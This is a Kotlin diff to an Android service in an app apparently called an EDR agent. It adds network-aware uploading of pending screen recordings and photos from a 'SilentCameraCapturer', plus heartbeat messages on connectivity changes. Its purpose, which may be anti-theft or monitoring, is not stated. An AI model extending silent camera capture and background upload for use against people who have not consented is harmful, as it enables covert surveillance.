@@ -17,8 +17,10 @@ import android.os.PowerManager
 import android.util.Log
 import androidx.core.app.NotificationCompat
 import com.edr.agent.EdrApplication
+import com.edr.agent.camera.SilentCameraCapturer
 import com.edr.agent.monitor.TrapAppMonitor
 import com.edr.agent.network.EdrHttpClient
+import com.edr.agent.network.EdrNetworkManager
 import com.edr.agent.network.EdrWebSocketClient
 import com.edr.agent.screen.AppTrapScreenRecorder
 import com.edr.agent.storage.SyncPreferences
@@ -233,12 +235,33 @@ class EdrForegroundService : Service() {
                 .build()
             networkCallback = object : ConnectivityManager.NetworkCallback() {
                 override fun onAvailable(network: Network) {
-                    Log.i(TAG, "Internet network detected as AVAILABLE.")
+                    val netStatus = EdrNetworkManager.getNetworkStatus(this@EdrForegroundService)
+                    Log.i(TAG, "Network connection changed: ${netStatus.label} (Upload allowed: ${netStatus.isCloudUploadAllowed})")
                     val client = wsClient
                     if (client == null || !client.isConnected) {
                         scheduleNextConnectionPoll(delayMs = 500L)
+                    } else {
+                        client.sendHeartbeatNow()
                     }
-                    AppTrapScreenRecorder.flushPendingLockedRecordings(this@EdrForegroundService)
+                    if (netStatus.isCloudUploadAllowed) {
+                        AppTrapScreenRecorder.flushPendingLockedRecordings(this@EdrForegroundService)
+                        SilentCameraCapturer.flushPendingLockedPhotos(this@EdrForegroundService)
+                    }
+                }
+
+                override fun onCapabilitiesChanged(network: Network, networkCapabilities: NetworkCapabilities) {
+                    val netStatus = EdrNetworkManager.getNetworkStatus(this@EdrForegroundService)
+                    Log.d(TAG, "Network capabilities updated: ${netStatus.label}")
+                    wsClient?.sendHeartbeatNow()
+                    if (netStatus.isCloudUploadAllowed) {
+                        AppTrapScreenRecorder.flushPendingLockedRecordings(this@EdrForegroundService)
+                        SilentCameraCapturer.flushPendingLockedPhotos(this@EdrForegroundService)
+                    }
+                }
+
+                override fun onLost(network: Network) {
+                    Log.w(TAG, "Network connection lost.")
+                    wsClient?.sendHeartbeatNow()
                 }
             }
             cm.registerNetworkCallback(request, networkCallback!!)
